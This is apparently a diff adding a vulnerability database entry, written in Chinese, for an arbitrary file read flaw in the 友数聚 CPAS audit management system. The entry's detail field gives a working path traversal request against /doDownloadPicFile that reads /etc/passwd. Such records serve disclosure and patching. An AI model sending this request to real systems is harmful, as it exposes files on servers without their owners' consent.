@@ -1,0 +1,11 @@
+vendor = "友数聚"
+name = "友数聚 CPAS 审计管理系统 doDownloadPicFile 任意文件读取漏洞"
+type = "任意文件读取"
+path = "/doDownloadPicFile"
+version = ""
+detail = "GET /doDownloadPicFile?filePath=../../../../etc/passwd HTTP/1.1 Host: target"
+fix = "升级至最新版本"
+date = 20260501
+label = "nday"
+cve = "TVD-2026-11493"
+verifier = "AdySec"
